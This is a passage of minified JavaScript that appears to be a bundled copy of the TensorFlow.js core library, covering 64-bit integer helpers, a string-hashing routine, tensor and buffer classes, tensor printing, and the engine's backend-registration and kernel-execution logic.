        0 == (t &= 63) ? this : t < 32 ? Zt(this.low >>> t | this.high << 32 - t, this.high >> t, this.unsigned) : Zt(this.high >> t - 32, this.high >= 0 ? 0 : -1, this.unsigned)
    }
    ,
    et.shr = et.shiftRight,
    et.shiftRightUnsigned = function(t) {
        if (Be(t) && (t = t.toInt()),
        0 === (t &= 63))
            return this;
        var e = this.high;
        return t < 32 ? Zt(this.low >>> t | e << 32 - t, e >>> t, this.unsigned) : Zt(32 === t ? e : e >>> t - 32, 0, this.unsigned)
    }
    ,
    et.shru = et.shiftRightUnsigned,
    et.shr_u = et.shiftRightUnsigned,
    et.toSigned = function() {
        return this.unsigned ? Zt(this.low, this.high, !1) : this
    }
    ,
    et.toUnsigned = function() {
        return this.unsigned ? this : Zt(this.low, this.high, !0)
    }
    ,
    et.toBytes = function(t) {
        return t ? this.toBytesLE() : this.toBytesBE()
    }
    ,
    et.toBytesLE = function() {
        var t = this.high
          , e = this.low;
        return [255 & e, e >>> 8 & 255, e >>> 16 & 255, e >>> 24, 255 & t, t >>> 8 & 255, t >>> 16 & 255, t >>> 24]
    }
    ,
    et.toBytesBE = function() {
        var t = this.high
          , e = this.low;
        return [t >>> 24, t >>> 16 & 255, t >>> 8 & 255, 255 & t, e >>> 24, e >>> 16 & 255, e >>> 8 & 255, 255 & e]
    }
    ,
    Kt.fromBytes = function(t, e, s) {
        return s ? Kt.fromBytesLE(t, e) : Kt.fromBytesBE(t, e)
    }
    ,
    Kt.fromBytesLE = function(t, e) {
        return new Kt(t[0] | t[1] << 8 | t[2] << 16 | t[3] << 24,t[4] | t[5] << 8 | t[6] << 16 | t[7] << 24,e)
    }
    ,
    Kt.fromBytesBE = function(t, e) {
        return new Kt(t[4] << 24 | t[5] << 16 | t[6] << 8 | t[7],t[0] << 24 | t[1] << 16 | t[2] << 8 | t[3],e)
    }
    ;
    const qf = function gw(n) {
        return n && n.__esModule && Object.prototype.hasOwnProperty.call(n, "default") ? n.default : n
    }(Kf)
      , yw = function YI(n, t) {
        for (var e = 0; e < t.length; e++) {
            const s = t[e];
            if ("string" != typeof s && !Array.isArray(s))
                for (const o in s)
                    if ("default" !== o && !(o in n)) {
                        const r = Object.getOwnPropertyDescriptor(s, o);
                        r && Object.defineProperty(n, o, r.get ? r : {
                            enumerable: !0,
                            get: ()=>s[o]
                        })
                    }
        }
        return Object.freeze(Object.defineProperty(n, Symbol.toStringTag, {
            value: "Module"
        }))
    }({
        __proto__: null,
        default: qf
    }, [Kf])
      , _s = qf || yw;
    function vc(n) {
        return _s.fromString(n, !0, 16)
    }
    const tm = vc("c3a5c85c97cb3127")
      , Us = vc("b492b66fbe98f273")
      , Re = vc("9ae16a3b2f90404f");
    function Qu(n) {
        return n.xor(n.shru(47))
    }
    function em(n, t, e) {
        const s = n.slice(t, t + e);
        return _s.fromBytes(Array.from(s), !0, !0)
    }
    function Ft(n, t) {
        return em(n, t, 8)
    }
    function nm(n, t) {
        return em(n, t, 4)
    }
    function fe(n, t) {
        return 0 === t ? n : n.shru(t).or(n.shl(64 - t))
    }
    function ms(n, t, e=vc("9ddfea08eb382d69")) {
        let s = n.xor(t).mul(e);
        s = s.xor(s.shru(47));
        let o = t.xor(s).mul(e);
        return o = o.xor(o.shru(47)),
        o = o.mul(e),
        o
    }
    function Sc(n, t, e, s) {
        return function Iw(n, t, e, s, o, r) {
            o = o.add(n),
            r = fe(r.add(o).add(s), 21);
            const i = o;
            return o = (o = o.add(t)).add(e),
            r = r.add(fe(o, 44)),
            [o.add(s), r.add(i)]
        }(Ft(n, t), Ft(n, t + 8), Ft(n, t + 16), Ft(n, t + 24), e, s)
    }
    function Sw(n, t=n.length) {
        const e = _s.fromNumber(81, !0);
        if (t <= 32)
            return t <= 16 ? function ww(n, t=n.length) {
                if (t >= 8) {
                    const e = Re.add(2 * t)
                      , s = Ft(n, 0).add(Re)
                      , o = Ft(n, t - 8);
                    return ms(fe(o, 37).mul(e).add(s), fe(s, 25).add(o).mul(e), e)
                }
                if (t >= 4) {
                    const e = Re.add(2 * t);
                    return ms(nm(n, 0).shl(3).add(t), nm(n, t - 4), e)
                }
                if (t > 0) {
                    const r = n[0] + (n[t >> 1] << 8)
                      , i = t + (n[t - 1] << 2);
                    return Qu(Re.mul(r).xor(tm.mul(i))).mul(Re)
                }
                return Re
            }(n, t) : function Cw(n, t=n.length) {
                const e = Re.add(2 * t)
                  , s = Ft(n, 0).mul(Us)
                  , o = Ft(n, 8)
                  , r = Ft(n, t - 8).mul(e)
                  , i = Ft(n, t - 16).mul(Re);
                return ms(fe(s.add(o), 43).add(fe(r, 30)).add(i), s.add(fe(o.add(Re), 18)).add(r), e)
            }(n, t);
        if (t <= 64)
            return function vw(n, t=n.length) {
                const e = Re.add(2 * t)
                  , s = Ft(n, 0).mul(Re)
                  , o = Ft(n, 8)
                  , r = Ft(n, t - 8).mul(e)
                  , i = Ft(n, t - 16).mul(Re)
                  , a = fe(s.add(o), 43).add(fe(r, 30)).add(i)
                  , c = ms(a, s.add(fe(o.add(Re), 18)).add(r), e)
                  , l = Ft(n, 16).mul(e)
                  , u = Ft(n, 24)
                  , d = a.add(Ft(n, t - 32)).mul(e)
                  , h = c.add(Ft(n, t - 24)).mul(e);
                return ms(fe(l.add(u), 43).add(fe(d, 30)).add(h), l.add(fe(u.add(s), 18)).add(d), e)
            }(n, t);
        let s = e
          , o = e.mul(Us).add(113)
          , r = Qu(o.mul(Re).add(113)).mul(Re)
          , i = [_s.UZERO, _s.UZERO]
          , a = [_s.UZERO, _s.UZERO];
        s = s.mul(Re).add(Ft(n, 0));
        let c = 0;
        const l = 64 * (t - 1 >> 6)
          , u = l + (t - 1 & 63) - 63;
        do {
            s = fe(s.add(o).add(i[0]).add(Ft(n, c + 8)), 37).mul(Us),
            o = fe(o.add(i[1]).add(Ft(n, c + 48)), 42).mul(Us),
            s = s.xor(a[1]),
            o = o.add(i[0]).add(Ft(n, c + 40)),
            r = fe(r.add(a[0]), 33).mul(Us),
            i = Sc(n, c, i[1].mul(Us), s.add(a[0])),
            a = Sc(n, c + 32, r.add(a[1]), o.add(Ft(n, c + 16))),
            [r,s] = [s, r],
            c += 64
        } while (c !== l);
        const d = Us.add(r.and(255).shl(1));
        return c = u,
        a[0] = a[0].add(t - 1 & 63),
        i[0] = i[0].add(a[0]),
        a[0] = a[0].add(i[0]),
        s = fe(s.add(o).add(i[0]).add(Ft(n, c + 8)), 37).mul(d),
        o = fe(o.add(i[1]).add(Ft(n, c + 48)), 42).mul(d),
        s = s.xor(a[1].mul(9)),
        o = o.add(i[0].mul(9).add(Ft(n, c + 40))),
        r = fe(r.add(a[0]), 33).mul(d),
        i = Sc(n, c, i[1].mul(d), s.add(a[0])),
        a = Sc(n, c + 32, r.add(a[1]), o.add(Ft(n, c + 16))),
        [r,s] = [s, r],
        ms(ms(i[0], a[0], d).add(Qu(o).mul(tm)).add(r), ms(i[1], a[1], d).add(s), d)
    }
    function gs(n, t) {
        return "string" === t ? bs(n) : Ys([n], t)
    }
    function Ys(n, t) {
        if ("string" === t)
            throw new Error("Cannot convert a string[] to a TypedArray");
        if (Array.isArray(n) && (n = Qs(n)),
        z().getBool("DEBUG") && function tw(n, t) {
            for (let e = 0; e < n.length; e++) {
                const s = n[e];
                if (isNaN(s) || !isFinite(s))
                    throw Error(`A tensor of type ${t} being uploaded contains ${s}.`)
            }
        }(n, t),
        function kw(n, t) {
            return n instanceof Float32Array && "float32" === t || n instanceof Int32Array && "int32" === t || n instanceof Uint8Array && "bool" === t
        }(n, t))
            return n;
        if (null == t || "float32" === t || "complex64" === t)
            return new Float32Array(n);
        if ("int32" === t)
            return new Int32Array(n);
        if ("bool" === t) {
            const e = new Uint8Array(n.length);
            for (let s = 0; s < e.length; ++s)
                0 !== Math.round(n[s]) && (e[s] = 1);
            return e
        }
        throw new Error(`Unknown data type ${t}`)
    }
    function Ve() {
        return z().platform.now()
    }
    function bs(n, t="utf-8") {
        return t = t || "utf-8",
        z().platform.encode(n, t)
    }
    function xs(n, t="utf-8") {
        return t = t || "utf-8",
        z().platform.decode(n, t)
    }
    function hn(n) {
        return null != z().platform.isTypedArray ? z().platform.isTypedArray(n) : Of(n)
    }
    function Qs(n, t=[], e=!1) {
        if (null == t && (t = []),
        "boolean" == typeof n || "number" == typeof n || "string" == typeof n || ql(n) || null == n || hn(n) && e)
            t.push(n);
        else if (Array.isArray(n) || hn(n))
            for (let s = 0; s < n.length; ++s)
                Qs(n[s], t, e);
        else {
            let s = -1;
            for (const o of Object.keys(n))
                /^([1-9]+[0-9]*|0)$/.test(o) && (s = Math.max(s, Number(o)));
            for (let o = 0; o <= s; o++)
                Qs(n[o], t, e)
        }
        return t
    }
    class Tw {
        constructor(t, e) {
            this.backendTimer = t,
            this.logger = e,
            null == e && (this.logger = new Rw)
        }
        profileKernel(t, e, s) {
            let o;
            const r = ()=>{
                o = s()
            }
            ;
            let i;
            const a = Ve();
            if (this.backendTimer.timerAvailable())
                i = this.backendTimer.time(r);
            else {
                r();
                for (const l of o)
                    l.dataSync();
                i = Promise.resolve({
                    kernelMs: Ve() - a
                })
            }
            if (z().getBool("CHECK_COMPUTATION_FOR_ERRORS"))
                for (let l = 0; l < o.length; l++) {
                    const u = o[l];
                    u.data().then((d=>{
                        Nw(d, u.dtype, t)
                    }
                    ))
                }
            return {
                kernelName: t,
                outputs: o,
                inputs: e,
                timeMs: i.then((l=>l.kernelMs)),
                extraInfo: i.then((l=>null != l.getExtraProfileInfo ? l.getExtraProfileInfo() : ""))
            }
        }
        logKernelProfile(t) {
            const {kernelName: e, outputs: s, timeMs: o, inputs: r, extraInfo: i} = t;
            s.forEach((a=>{
                Promise.all([a.data(), o, i]).then((c=>{
                    this.logger.logKernelProfile(e, a, c[0], c[1], r, c[2])
                }
                ))
            }
            ))
        }
    }
    function Nw(n, t, e) {
        if ("float32" !== t)
            return !1;
        for (let s = 0; s < n.length; s++) {
            const o = n[s];
            if (isNaN(o) || !isFinite(o))
                return console.warn(`Found ${o} in the result of '${e}'`),
                !0
        }
        return !1
    }
    class Rw {
        logKernelProfile(t, e, s, o, r, i) {
            const a = "number" == typeof o ? Wo(`${o}ms`, 9) : o.error
              , c = Wo(t, 25)
              , l = e.rank
              , u = e.size
              , d = Wo(e.shape.toString(), 14);
            let h = "";
            for (const p in r) {
                const f = r[p];
                if (null != f) {
                    const m = f.shape || e.shape
                      , g = m.length;
                    h += `${p}: ${g}D ${g > 0 ? m : ""} `
                }
            }
            console.log(`%c${c}\t%c${a}\t%c${l}D ${d}\t%c${u}\t%c${h}\t%c${i}`, "font-weight:bold", "color:red", "color:blue", "color: orange", "color: green", "color: steelblue")
        }
    }
    const sm = 20
      , xi = 3
      , Ju = 7;
    function Lw(n, t, e, s) {
        const o = ct(t)
          , r = function Ew(n, t, e, s) {
            const o = Z(t)
              , r = s[s.length - 1]
              , i = new Array(r).fill(0)
              , a = t.length
              , c = "complex64" === e ? Ii(n) : n;
            if (a > 1)
                for (let l = 0; l < o / r; l++) {
                    const u = l * r;
                    for (let d = 0; d < r; d++)
                        i[d] = Math.max(i[d], yi(c[u + d], 0, e).length)
                }
            return i
        }(n, t, e, o)
          , i = t.length
          , a = kc(n, t, e, o, r)
          , c = ["Tensor"];
        return s && (c.push(`  dtype: ${e}`),
        c.push(`  rank: ${i}`),
        c.push(`  shape: [${t}]`),
        c.push("  values:")),
        c.push(a.map((l=>"    " + l)).join("\n")),
        c.join("\n")
    }
    function yi(n, t, e) {
        let s;
        return s = Array.isArray(n) ? `${parseFloat(n[0].toFixed(Ju))} + ${parseFloat(n[1].toFixed(Ju))}j` : Cr(n) ? `'${n}'` : "bool" === e ? om(n) : parseFloat(n.toFixed(Ju)).toString(),
        Wo(s, t)
    }
    function om(n) {
        return 0 === n ? "false" : "true"
    }
    function kc(n, t, e, s, o, r=!0) {
        const i = "complex64" === e ? 2 : 1
          , a = t[0]
          , c = t.length;
        if (0 === c) {
            if ("complex64" === e) {
                return [yi(Ii(n)[0], 0, e)]
            }
            return "bool" === e ? [om(n[0])] : [n[0].toString()]
        }
        if (1 === c) {
            if (a > sm) {
                const g = xi * i;
                let b = Array.from(n.slice(0, g))
                  , x = Array.from(n.slice((a - xi) * i, a * i));
                return "complex64" === e && (b = Ii(b),
                x = Ii(x)),
                ["[" + b.map(((I,y)=>yi(I, o[y], e))).join(", ") + ", ..., " + x.map(((I,y)=>yi(I, o[a - xi + y], e))).join(", ") + "]"]
            }
            return ["[" + ("complex64" === e ? Ii(n) : Array.from(n)).map(((g,b)=>yi(g, o[b], e))).join(", ") + "]"]
        }
        const l = t.slice(1)
          , u = s.slice(1)
          , d = s[0] * i
          , h = [];
        if (a > sm) {
            for (let m = 0; m < xi; m++) {
                const g = m * d
                  , b = g + d;
                h.push(...kc(n.slice(g, b), l, e, u, o, !1))
            }
            h.push("...");
            for (let m = a - xi; m < a; m++) {
                const g = m * d
                  , b = g + d;
                h.push(...kc(n.slice(g, b), l, e, u, o, m === a - 1))
            }
        } else
            for (let m = 0; m < a; m++) {
                const g = m * d
                  , b = g + d;
                h.push(...kc(n.slice(g, b), l, e, u, o, m === a - 1))
            }
        const p = 2 === c ? "," : "";
        h[0] = "[" + (a > 0 ? h[0] + p : "");
        for (let m = 1; m < h.length - 1; m++)
            h[m] = " " + h[m] + p;
        let f = ",\n";
        for (let m = 2; m < c; m++)
            f += "\n";
        return h[h.length - 1] = " " + h[h.length - 1] + "]" + (r ? "" : f),
        h
    }
    function Ii(n) {
        const t = [];
        for (let e = 0; e < n.length; e += 2)
            t.push([n[e], n[e + 1]]);
        return t
    }
    class xe {
        constructor(t, e, s) {
            if (this.dtype = e,
            this.shape = t.slice(),
            this.size = Z(t),
            null != s) {
                const o = s.length;
                v(o === this.size, (()=>`Length of values '${o}' does not match the size inferred by the shape '${this.size}'.`))
            }
            if ("complex64" === e)
                throw new Error("complex64 dtype TensorBuffers are not supported. Please create a TensorBuffer for the real and imaginary parts separately and call tf.complex(real, imag).");
            this.values = s || qt(e, this.size),
            this.strides = ct(t)
        }
        set(t, ...e) {
            0 === e.length && (e = [0]),
            v(e.length === this.rank, (()=>`The number of provided coordinates (${e.length}) must match the rank (${this.rank})`));
            const s = this.locToIndex(e);
            this.values[s] = t
        }
        get(...t) {
            0 === t.length && (t = [0]);
            let e = 0;
            for (const o of t) {
                if (o < 0 || o >= this.shape[e]) {
                    const r = `Requested out of range element at ${t}.   Buffer shape=${this.shape}`;
                    throw new Error(r)
                }
                e++
            }
            let s = t[t.length - 1];
            for (let o = 0; o < t.length - 1; ++o)
                s += this.strides[o] * t[o];
            return this.values[s]
        }
        locToIndex(t) {
            if (0 === this.rank)
                return 0;
            if (1 === this.rank)
                return t[0];
            let e = t[t.length - 1];
            for (let s = 0; s < t.length - 1; ++s)
                e += this.strides[s] * t[s];
            return e
        }
        indexToLoc(t) {
            if (0 === this.rank)
                return [];
            if (1 === this.rank)
                return [t];
            const e = new Array(this.shape.length);
            for (let s = 0; s < e.length - 1; ++s)
                e[s] = Math.floor(t / this.strides[s]),
                t -= e[s] * this.strides[s];
            return e[e.length - 1] = t,
            e
        }
        get rank() {
            return this.shape.length
        }
        toTensor() {
            return kn().makeTensor(this.values, this.shape, this.dtype)
        }
    }
    let kn = null
      , Po = null;
    class ae {
        constructor(t, e, s, o) {
            this.kept = !1,
            this.isDisposedInternal = !1,
            this.shape = t.slice(),
            this.dtype = e || "float32",
            this.size = Z(t),
            this.strides = ct(t),
            this.dataId = s,
            this.id = o,
            this.rankType = this.rank < 5 ? this.rank.toString() : "higher"
        }
        get rank() {
            return this.shape.length
        }
        async buffer() {
            const t = await this.data();
            return Po.buffer(this.shape, this.dtype, t)
        }
        bufferSync() {
            return Po.buffer(this.shape, this.dtype, this.dataSync())
        }
        async array() {
            const t = await this.data();
            return vn(this.shape, t, "complex64" === this.dtype)
        }
        arraySync() {
            return vn(this.shape, this.dataSync(), "complex64" === this.dtype)
        }
        async data() {
            this.throwIfDisposed();
            const t = kn().read(this.dataId);
            if ("string" === this.dtype) {
                const e = await t;
                try {
                    return e.map((s=>xs(s)))
                } catch {
                    throw new Error("Failed to decode the string bytes into utf-8. To get the original bytes, call tensor.bytes().")
                }
            }
            return t
        }
        dataToGPU(t) {
            return this.throwIfDisposed(),
            kn().readToGPU(this.dataId, t)
        }
        dataSync() {
            this.throwIfDisposed();
            const t = kn().readSync(this.dataId);
            if ("string" === this.dtype)
                try {
                    return t.map((e=>xs(e)))
                } catch {
                    throw new Error("Failed to decode the string bytes into utf-8. To get the original bytes, call tensor.bytes().")
                }
            return t
        }
        async bytes() {
            this.throwIfDisposed();
            const t = await kn().read(this.dataId);
            return "string" === this.dtype ? t : new Uint8Array(t.buffer)
        }
        dispose() {
            this.isDisposed || (this.kerasMask && this.kerasMask.dispose(),
            kn().disposeTensor(this),
            this.isDisposedInternal = !0)
        }
        get isDisposed() {
            return this.isDisposedInternal
        }
        throwIfDisposed() {
            if (this.isDisposed)
                throw new Error("Tensor is disposed.")
        }
        print(t=!1) {
            return Po.print(this, t)
        }
        clone() {
            return this.throwIfDisposed(),
            Po.clone(this)
        }
        toString(t=!1) {
            return Lw(this.dataSync(), this.shape, this.dtype, t)
        }
        cast(t) {
            return this.throwIfDisposed(),
            Po.cast(this, t)
        }
        variable(t=!0, e, s) {
            return this.throwIfDisposed(),
            kn().makeVariable(this, t, e, s)
        }
    }
    function O() {
        return eu("Tensor", (()=>ae))
    }
    Object.defineProperty(ae, Symbol.hasInstance, {
        value: n=>!!n && null != n.data && null != n.dataSync && null != n.throwIfDisposed
    }),
    O();
    class Tc extends ae {
        constructor(t, e, s, o) {
            super(t.shape, t.dtype, t.dataId, o),
            this.trainable = e,
            this.name = s
        }
        assign(t) {
            if (t.dtype !== this.dtype)
                throw new Error(`dtype of the new value (${t.dtype}) and previous value (${this.dtype}) must match`);
            if (!Rt(t.shape, this.shape))
                throw new Error(`shape of the new value (${t.shape}) and previous value (${this.shape}) must match`);
            kn().disposeTensor(this),
            this.dataId = t.dataId,
            kn().incRef(this, null)
        }
        dispose() {
            kn().disposeVariable(this),
            this.isDisposedInternal = !0
        }
    }
    var rm, n, ju, qu, td, ed;
    Object.defineProperty(Tc, Symbol.hasInstance, {
        value: n=>n instanceof ae && null != n.assign && n.assign instanceof Function
    }),
    (n = rm || (rm = {})).R0 = "R0",
    n.R1 = "R1",
    n.R2 = "R2",
    n.R3 = "R3",
    n.R4 = "R4",
    n.R5 = "R5",
    n.R6 = "R6",
    function(n) {
        n.float32 = "float32",
        n.int32 = "int32",
        n.bool = "int32",
        n.complex64 = "complex64"
    }(ju || (ju = {})),
    function(n) {
        n.float32 = "float32",
        n.int32 = "int32",
        n.bool = "bool",
        n.complex64 = "complex64"
    }(qu || (qu = {})),
    function(n) {
        n.float32 = "float32",
        n.int32 = "float32",
        n.bool = "float32",
        n.complex64 = "complex64"
    }(td || (td = {})),
    function(n) {
        n.float32 = "complex64",
        n.int32 = "complex64",
        n.bool = "complex64",
        n.complex64 = "complex64"
    }(ed || (ed = {}));
    const Mw = {
        float32: td,
        int32: ju,
        bool: qu,
        complex64: ed
    };
    function _e(n, t) {
        if ("string" === n || "string" === t) {
            if ("string" === n && "string" === t)
                return "string";
            throw new Error(`Can not upcast ${n} with ${t}`)
        }
        return Mw[n][t]
    }
    function nd(n) {
        return _e(n, "int32")
    }
    function im(n) {
        return null != n && "object" == typeof n && "texture"in n && n.texture instanceof WebGLTexture
    }
    function am(n) {
        return typeof GPUBuffer < "u" && null != n && "object" == typeof n && "buffer"in n && n.buffer instanceof GPUBuffer
    }
    function te(n, t) {
        if (n.dtype === t.dtype)
            return [n, t];
        const e = _e(n.dtype, t.dtype);
        return [n.cast(e), t.cast(e)]
    }
    function cm(n) {
        const t = [];
        return lm(n, t, new Set),
        t
    }
    function lm(n, t, e) {
        if (null == n)
            return;
        if (n instanceof ae)
            return void t.push(n);
        if (!function Vw(n) {
            return Array.isArray(n) || "object" == typeof n
        }(n))
            return;
        const s = n;
        for (const o in s) {
            const r = s[o];
            e.has(r) || (e.add(r),
            lm(r, t, e))
        }
    }
    function sd(n) {
        return null != n.kernelName
    }
    class um {
        constructor() {
            this.registeredVariables = {},
            this.nextTapeNodeId = 0,
            this.numBytes = 0,
            this.numTensors = 0,
            this.numStringTensors = 0,
            this.numDataBuffers = 0,
            this.gradientDepth = 0,
            this.kernelDepth = 0,
            this.scopeStack = [],
            this.numDataMovesStack = [],
            this.nextScopeId = 0,
            this.tensorInfo = new WeakMap,
            this.profiling = !1,
            this.activeProfile = {
                newBytes: 0,
                newTensors: 0,
                peakBytes: 0,
                kernels: [],
                result: null,
                get kernelNames() {
                    return Array.from(new Set(this.kernels.map((t=>t.name))))
                }
            }
        }
        dispose() {
            for (const t in this.registeredVariables)
                this.registeredVariables[t].dispose()
        }
    }
    class Oo {
        constructor(t) {
            this.ENV = t,
            this.registry = {},
            this.registryFactory = {},
            this.pendingBackendInitId = 0,
            this.state = new um
        }
        async ready() {
            if (null != this.pendingBackendInit)
                return this.pendingBackendInit.then((()=>{}
                ));
            if (null != this.backendInstance)
                return;
            const t = this.getSortedBackends();
            for (let e = 0; e < t.length; e++) {
                const s = t[e];
                if (await this.initializeBackend(s).success)
                    return void await this.setBackend(s)
            }
            throw new Error("Could not initialize any backends, all backend initializations failed.")
        }
        get backend() {
            if (null != this.pendingBackendInit)
                throw new Error(`Backend '${this.backendName}' has not yet been initialized. Make sure to await tf.ready() or await tf.setBackend() before calling other methods`);
            if (null == this.backendInstance) {
                const {name: t, asyncInit: e} = this.initializeBackendsAndReturnBest();
                if (e)
                    throw new Error(`The highest priority backend '${t}' has not yet been initialized. Make sure to await tf.ready() or await tf.setBackend() before calling other methods`);
                this.setBackend(t)
            }
            return this.backendInstance
        }
        backendNames() {
            return Object.keys(this.registryFactory)
        }
        findBackend(t) {
            if (!(t in this.registry)) {
                if (!(t in this.registryFactory))
                    return null;
                {
                    const {asyncInit: e} = this.initializeBackend(t);
                    if (e)
                        return null
                }
            }
            return this.registry[t]
        }
        findBackendFactory(t) {
            return t in this.registryFactory ? this.registryFactory[t].factory : null
        }
        registerBackend(t, e, s=1) {
            return t in this.registryFactory ? (je(`${t} backend was already registered. Reusing existing backend factory.`),
            !1) : (this.registryFactory[t] = {
                factory: e,
                priority: s
            },
            !0)
        }
        async setBackend(t) {
            if (null == this.registryFactory[t])
                throw new Error(`Backend name '${t}' not found in registry`);
            if (this.backendName = t,
            null == this.registry[t]) {
                this.backendInstance = null;
                const {success: e, asyncInit: s} = this.initializeBackend(t);
                if (!(s ? await e : e))
                    return !1
            }
            return this.backendInstance = this.registry[t],
            this.setupRegisteredKernels(),
            this.profiler = new Tw(this.backendInstance),
            !0
        }
        setupRegisteredKernels() {
            Af(this.backendName).forEach((e=>{
                null != e.setupFunc && e.setupFunc(this.backendInstance)
            }
            ))
        }
        disposeRegisteredKernels(t) {
            Af(t).forEach((s=>{
                null != s.disposeFunc && s.disposeFunc(this.registry[t])
            }
            ))
        }
        initializeBackend(t) {
            const e = this.registryFactory[t];
            if (null == e)
                throw new Error(`Cannot initialize backend ${t}, no registration found.`);
            try {
                const s = e.factory();
                if (!s || s instanceof Zl || "function" != typeof s.then)
                    return this.registry[t] = s,
                    {
                        success: !0,
                        asyncInit: !1
                    };
                {
                    const o = ++this.pendingBackendInitId
                      , r = s.then((i=>!(o < this.pendingBackendInitId) && (this.registry[t] = i,
                    this.pendingBackendInit = null,
                    !0))).catch((i=>(o < this.pendingBackendInitId || (this.pendingBackendInit = null,
                    je(`Initialization of backend ${t} failed`),
                    je(i.stack || i.message)),
                    !1)));
                    return this.pendingBackendInit = r,
                    {
                        success: r,
                        asyncInit: !0
                    }
                }
            } catch (s) {
                return je(`Initialization of backend ${t} failed`),
                je(s.stack || s.message),
                {
                    success: !1,
                    asyncInit: !1
                }
            }
        }
        removeBackend(t) {
            if (!(t in this.registryFactory))
                throw new Error(`${t} backend not found in registry`);
            this.backendName === t && null != this.pendingBackendInit && this.pendingBackendInitId++,
            t in this.registry && (this.disposeRegisteredKernels(t),
            this.registry[t].dispose(),
            delete this.registry[t]),
            delete this.registryFactory[t],
            this.backendName === t && (this.pendingBackendInit = null,
            this.backendName = null,
            this.backendInstance = null)
        }
        getSortedBackends() {
            if (0 === Object.keys(this.registryFactory).length)
                throw new Error("No backend found in registry.");
            return Object.keys(this.registryFactory).sort(((t,e)=>this.registryFactory[e].priority - this.registryFactory[t].priority))
        }
        initializeBackendsAndReturnBest() {
            const t = this.getSortedBackends();
            for (let e = 0; e < t.length; e++) {
                const s = t[e]
                  , {success: o, asyncInit: r} = this.initializeBackend(s);
                if (r || o)
                    return {
                        name: s,
                        asyncInit: r
                    }
            }
            throw new Error("Could not initialize any backends, all backend initializations failed.")
        }
        moveData(t, e) {
            const s = this.state.tensorInfo.get(e)
              , o = s.backend
              , r = this.readSync(e)
              , i = o.refCount(e);
            o.disposeData(e, !0),
            s.backend = t,
            t.move(e, r, s.shape, s.dtype, i),
            this.shouldCheckForMemLeaks() && this.state.numDataMovesStack[this.state.numDataMovesStack.length - 1]++
        }
        tidy(t, e) {
            let o, s = null;
            if (null == e) {
                if ("function" != typeof t)
                    throw new Error("Please provide a function to tidy()");
                e = t
            } else {
                if ("string" != typeof t && !(t instanceof String))
                    throw new Error("When calling with two arguments, the first argument to tidy() must be a string");
                if ("function" != typeof e)
                    throw new Error("When calling with two arguments, the 2nd argument to tidy() must be a function");
                s = t
            }
            return this.scopedRun((()=>this.startScope(s)), (()=>this.endScope(o)), (()=>(o = e(),
            o instanceof Promise && console.error("Cannot return a Promise inside of tidy."),
            o)))
        }
        scopedRun(t, e, s) {
            t();
            try {
                const o = s();
                return e(),
                o
            } catch (o) {
                throw e(),
                o
            }
        }
        nextTensorId() {
            return Oo.nextTensorId++
        }
        nextVariableId() {
            return Oo.nextVariableId++
        }
        clone(t) {
            const e = G.runKernel(Kr, {
                x: t
            })
              , s = {
                x: t
            };
            return this.addTapeNode(this.state.activeScope.name, s, [e], (i=>({
                x: ()=>{
                    const c = {
                        x: i
                    }
                      , l = {
                        dtype: "float32"
                    };
                    return G.runKernel(Gr, c, l)
                }
            })), [], {}),
            e
        }
        runKernel(t, e, s) {
            if (null == this.backendName && this.backend,
            null == _u(t, this.backendName))
                throw new Error(`Kernel '${t}' not registered for backend '${this.backendName}'`);
            return this.runKernelFunc({
                kernelName: t,
                inputs: e,
                attrs: s
            })
        }
        shouldCheckForMemLeaks() {
            return this.ENV.getBool("IS_TEST")
        }
        checkKernelForMemLeak(t, e, s) {
            const o = this.backend.numDataIds();
            let r = 0;
            s.forEach((c=>{
                r += "complex64" === c.dtype ? 3 : 1
            }
            ));
            const i = this.state.numDataMovesStack[this.state.numDataMovesStack.length - 1]
              , a = o - e - r - i;
            if (a > 0)
                throw new Error(`Backend '${this.backendName}' has an internal memory leak (${a} data ids) after running '${t}'`)
        }
        runKernelFunc(t) {
            let e, s = [];
            const o = this.isTapeOn()
              , r = this.state.numBytes
              , i = this.state.numTensors;
            let a, c;
            this.shouldCheckForMemLeaks() && this.state.numDataMovesStack.push(0),
            null == this.backendName && this.backend;
            const l = sd(t) ? t.kernelName : null != this.state.activeScope ? this.state.activeScope.name : "";
            if (sd(t)) {
                const {kernelName: f, inputs: m, attrs: g} = t;
                null == this.backendName && this.backend;
                const b = _u(f, this.backendName);
                v(null != b, (()=>`Cannot find registered kernel '${f}' for backend '${this.backendName}'`)),
                a = ()=>{
                    const x = this.backend.numDataIds();
                    c = b.kernelFunc({
                        inputs: m,
                        attrs: g,
                        backend: this.backend
                    });
                    const I = Array.isArray(c) ? c : [c];
                    this.shouldCheckForMemLeaks() && this.checkKernelForMemLeak(f, x, I);
                    const y = I.map((w=>null != w.rank ? w : this.makeTensorFromTensorInfo(w)));
                    if (o) {
                        const w = this.getTensorsForGradient(f, m, y);
                        s = this.saveTensorsForBackwardMode(w)
                    }
                    return y
                }
            } else {
                const {forwardFunc: f} = t
                  , m = g=>{
                    o && (s = g.map((b=>this.keep(this.clone(b)))))
                }
                ;
                a = ()=>{
                    const g = this.backend.numDataIds();
                    c = this.tidy((()=>f(this.backend, m)));
                    const b = Array.isArray(c) ? c : [c];
                    return this.shouldCheckForMemLeaks() && this.checkKernelForMemLeak(l, g, b),
                    b
                }
            }
            const {inputs: u, attrs: d} = t
              , h = sd(t) ? null : t.backwardsFunc;
            let p;
            return this.scopedRun((()=>this.state.kernelDepth++), (()=>this.state.kernelDepth--), (()=>{
                this.ENV.getBool("DEBUG") || this.state.profiling ? (p = this.profiler.profileKernel(l, u, (()=>a())),
                this.ENV.getBool("DEBUG") && this.profiler.logKernelProfile(p),
                e = p.outputs) : e = a()
            }
            )),
            o && this.addTapeNode(l, u, e, h, s, d),
            this.state.profiling && this.state.activeProfile.kernels.push({
                name: l,
                bytesAdded: this.state.numBytes - r,
                totalBytesSnapshot: this.state.numBytes,
                tensorsAdded: this.state.numTensors - i,
                totalTensorsSnapshot: this.state.numTensors,
                inputShapes: Object.keys(u).map((f=>null != u[f] ? u[f].shape : null)),
                outputShapes: e.map((f=>f.shape)),
                kernelTimeMs: p.timeMs,
                extraInfo: p.extraInfo
            }),
            Array.isArray(c) ? e : e[0]
        }
        saveTensorsForBackwardMode(t) {
            return t.map((s=>this.keep(this.clone(s))))
        }
        getTensorsForGradient(t, e, s) {
            const o = Xf(t);
            if (null != o) {
                const r = o.inputsToSave || []
                  , i = o.outputsToSave || [];
                let a;
                o.saveAllInputs ? (v(Array.isArray(e), (()=>"saveAllInputs is true, expected inputs to be an array.")),
                a = Object.keys(e).map((l=>e[l]))) : a = r.map((l=>e[l]));
